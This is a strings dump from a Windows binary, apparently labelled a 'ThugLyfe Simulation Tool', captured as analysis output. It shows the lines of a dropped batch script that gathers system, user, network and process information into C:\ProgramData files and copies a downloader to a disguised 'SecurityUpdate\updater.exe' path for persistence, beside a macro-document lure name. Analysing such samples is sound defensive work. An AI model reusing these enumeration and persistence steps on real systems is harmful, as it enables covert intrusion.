Number	Offset	Address		Size	Type	String
128	00008410	000000014000a010	Section(2)['.rdata']	28	A	========================================
129	0000843a	000000014000a03a	Section(2)['.rdata']	1a	A	  ThugLyfe Simulation Tool
130	00008458	000000014000a058	Section(2)['.rdata']	11	A	%Y-%m-%d %H:%M:%S
131	0000846a	000000014000a06a	Section(2)['.rdata']	1d	A	C:\ProgramData\SecurityUpdate
132	00008490	000000014000a090	Section(2)['.rdata']	28	A	C:\ProgramData\SecurityUpdate\update.log
133	000084b9	000000014000a0b9	Section(2)['.rdata']	15	A	SecurityAdvisory.docm
134	000084d2	000000014000a0d2	Section(2)['.rdata']	0d	A	cmd.exe /c %s
135	000084e0	000000014000a0e0	Section(2)['.rdata']	09	A	data1.bin
136	000084ea	000000014000a0ea	Section(2)['.rdata']	05	A	%s\%s
137	000084f0	000000014000a0f0	Section(2)['.rdata']	2f	A	C:\Users\IEUser\Documents\SecurityAdvisory.docm
138	00008520	000000014000a120	Section(2)['.rdata']	14	A	image_downloader.exe
139	00008538	000000014000a138	Section(2)['.rdata']	24	A	C:\Windows\Temp\image_downloader.exe
140	0000855d	000000014000a15d	Section(2)['.rdata']	0c	A	fileview.exe
141	0000856a	000000014000a16a	Section(2)['.rdata']	1c	A	C:\Windows\Temp\fileview.exe
142	00008587	000000014000a187	Section(2)['.rdata']	0d	A	frontpage.jpg
143	00008598	000000014000a198	Section(2)['.rdata']	26	A	C:\Users\Public\Pictures\frontpage.jpg
144	000085bf	000000014000a1bf	Section(2)['.rdata']	18	A	C:\ProgramData\asefa.bat
149	00008683	000000014000a283	Section(2)['.rdata']	1e	A	REM === SYSTEM ENUMERATION ===
151	000086cb	000000014000a2cb	Section(2)['.rdata']	2c	A	systeminfo > C:\ProgramData\sysinfo.txt 2>&1
153	00008727	000000014000a327	Section(2)['.rdata']	31	A	ipconfig /all > C:\ProgramData\netconfig.txt 2>&1
155	00008782	000000014000a382	Section(2)['.rdata']	2e	A	netstat -ano > C:\ProgramData\netstat.txt 2>&1
157	000087d8	000000014000a3d8	Section(2)['.rdata']	28	A	net user > C:\ProgramData\users.txt 2>&1
158	00008801	000000014000a401	Section(2)['.rdata']	3e	A	net localgroup administrators > C:\ProgramData\admins.txt 2>&1
160	00008868	000000014000a468	Section(2)['.rdata']	2f	A	tasklist /v > C:\ProgramData\processes.txt 2>&1
162	000088c1	000000014000a4c1	Section(2)['.rdata']	3b	A	schtasks /query /fo LIST /v > C:\ProgramData\tasks.txt 2>&1
164	00008925	000000014000a525	Section(2)['.rdata']	40	A	wmic product get name,version > C:\ProgramData\software.txt 2>&1
166	0000898d	000000014000a58d	Section(2)['.rdata']	42	A	wmic startup get caption,command > C:\ProgramData\startup.txt 2>&1
167	000089d1	000000014000a5d1	Section(2)['.rdata']	21	A	REM === PERSISTENCE MECHANISM ===
169	00008a19	000000014000a619	Section(2)['.rdata']	36	A	REM Copy image_downloader.exe to a persistent location
170	00008a50	000000014000a650	Section(2)['.rdata']	31	A	if exist "C:\Windows\Temp\image_downloader.exe" (
171	00008a82	000000014000a682	Section(2)['.rdata']	68	A	    copy /Y "C:\Windows\Temp\image_downloader.exe" "C:\ProgramData\SecurityUpdate\updater.exe" >nul 2>&1
172	00008aeb	000000014000a6eb	Section(2)['.rdata']	32	A	    echo [*] Payload copied to persistent location
173	00008b21	000000014000a721	Section(2)['.rdata']	2b	A	REM Create registry run key for persistence
